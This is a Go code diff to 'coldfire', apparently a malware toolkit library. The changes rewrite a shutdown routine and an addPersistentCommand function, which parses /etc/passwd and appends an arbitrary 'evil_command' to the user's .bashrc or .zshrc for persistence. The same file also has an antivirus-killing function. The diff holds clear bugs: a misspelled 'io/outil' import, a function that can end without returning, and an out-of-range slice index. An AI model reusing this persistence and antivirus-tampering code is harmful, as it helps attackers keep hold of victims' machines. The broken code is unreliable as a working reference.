@@ -3,6 +3,7 @@ package coldfire
 import (
 	"strings"
 	"syscall"
+	"io/outil"
 	"os/user"
 	"fmt"
 	"os"
@@ -47,10 +48,10 @@ func isRoot() bool {
 }
 
 func shutdown() error {
-	c := "shutdown +1"
-	_, err := cmdOut(c)
-
-	return err
+	err := syscall.Reboot(syscall.LINUX_REBOOT_CMD_POWER_OFF)
+	if err != nil {
+		return err
+	}
 }
 
 func pkillAv() error {
@@ -109,10 +110,48 @@ func wifiDisconnect() error {
 	return nil
 }
 
-func addPersistentCommand(cmd string) error {
-	_, err := cmdOut(fmt.Sprintf(`echo "%s" >> ~/.bashrc; echo "%s" >> ~/.zshrc`, cmd, cmd))
+func addPersistentCommand(evil_command string) error {
+	ep, err := os.Open("/etc/passwd")
+	if err != nil { return err }
+	data, err := ioutil.ReadAll(ep)
+	if err != nil { return err }
+	byline := strings.Split(string(data),"\n")
+	for  _,line := range byline {
+		splitted := strings.Split(line,":")
+		if len(splitted) >= 6 {
+			switch splitted[6] {
+				case "/bin/bash":
+					cu,err := GetUser()
+					if err != nil { return err }
+					if splitted[0] == cu {
+						pwd := "/home/"
+						pwd = pwd + splitted[0]
+						pwd = pwd + "/.bashrc"
+						f,err := os.OpenFile(pwd,os.O_APPEND|os.O_WRONLY,0644)
+						if err != nil { return err }
+						fmt.Fprintf(f,"%s",evil_command)
+						f.Close()
+					}
+				case "/bin/zsh":
+					cu, err := GetUser()
+					if err != nil { return err }
+					if splitted[0] == cu {
+						pwd := "/home/"
+						pwd = pwd + splitted[0]
+						pwd = pwd + "/.zshrc"
+						f,err := os.OpenFile(pwd,os.O_APPEND|os.O_WRONLY,0644)
+						if err != nil { return err }
+						fmt.Fprintf(f,"%s",evil_command)
+						f.Close()
+					}
+				default:
+					continue
+			}
+		}
+	}
 	return err
 }
+
 
 func disks() ([]string, error) {
 	found_drives := []string{}
